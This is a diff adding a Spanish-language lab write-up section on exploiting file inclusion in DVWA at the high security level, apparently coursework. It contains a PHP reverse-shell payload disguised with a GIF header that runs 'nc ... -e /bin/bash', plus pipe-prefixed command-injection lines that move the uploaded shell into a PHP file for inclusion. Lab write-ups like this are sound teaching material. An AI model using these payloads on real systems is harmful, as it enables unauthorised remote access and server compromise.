@@ -61,3 +61,34 @@ http://localhost/DVWA/vulnerabilities/fi/?page=Http://localhost/php-reverse-shel
 Como se puede ver, se ha vuelto a visualizar el archivo `fi.php` de donde extraemos todas las citas.
 
 ## Alto
+
+Al contrario que en los niveles anteriores, ahora para subir la reverse shell al servidor remoto debemos hacerlo aprovechando otra vulnerabilidad, en este caso la vulnerabilidad de `subida de archivos` o `file upload`. Para ello, podemos utilizar el script utilizado en la sección de `file upload`:
+
+```php
+GIF98
+<?php
+
+$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
+system($cmd);
+
+?>
+```
+
+Como se menciona en la otra sección se puede ver que se consigue subir el archivo `shell.png` a través de la siguiente URI:
+![uploaded-high](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/uploaded-h.png)
+
+```
+../../hackable/uploads/shell.png
+```
+
+```bash
+|ls ../../hackable/uploads/
+```
+
+```bash
+|mv ../../hackable/uploads/shell.png ../fi/file5.php
+```
+
+![challenge-4](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/challenge-4.png)
+
+/hackable/flags
